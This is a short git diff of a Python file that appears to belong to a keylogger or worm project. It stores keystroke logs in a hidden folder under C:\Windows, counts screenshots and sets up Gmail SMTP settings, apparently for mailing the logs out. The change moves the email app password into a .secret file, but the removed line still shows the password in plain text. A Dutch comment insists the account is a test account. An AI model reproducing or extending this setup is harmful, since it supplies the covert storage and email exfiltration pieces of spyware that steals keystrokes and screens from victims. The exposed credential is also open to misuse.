@@ -25,11 +25,25 @@ path = f"C:\\Windows\\s142486_WormFolder\\Logs_{dateTimeFolder}\\keylog.txt"
 logs = "C:\\Windows\\s142486_WormFolder" 
 paramsPath = os.path.join(hiddenFolderPath, "Params.json")
 
-# EXPRESS EMAIL SETTINGS EXPLICIET VERMELD OM TRANSPARANT TE ZIJN, DIT IS EEN TESTACCOUNT EN WORDT NIET GEBRUIKT VOOR MALWARE
+# secret reading
+def read_secrets(secrets_file):
+    secrets = {}
+    try:
+        with open(secrets_file, 'r') as file:
+            for line in file:
+                key, value = line.strip().split('=', 1)
+                secrets[key.strip()] = value.strip()
+    except FileNotFoundError:
+        pass
+    return secrets
+
+secrets = read_secrets('.secret')
+
+# EXPRESS EMAIL SETTINGS EXPLICIET VERMELD OM TRANSPARANT TE ZIJN, DIT IS EEN TESTACCOUNT EN WORDT NIET GEBRUIKT VOOR MALWARE APP PASSWORD WORD WEL VERBORGEN
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
 EMAIL = "Rvm855219@gmail.com"
-PASSWORD = "rtpq bdhn pqib rrgk"
+PASSWORD = secrets.get('gmail_app_password', '')
 logLock = threading.Lock()
 screenshotCount = 0
 
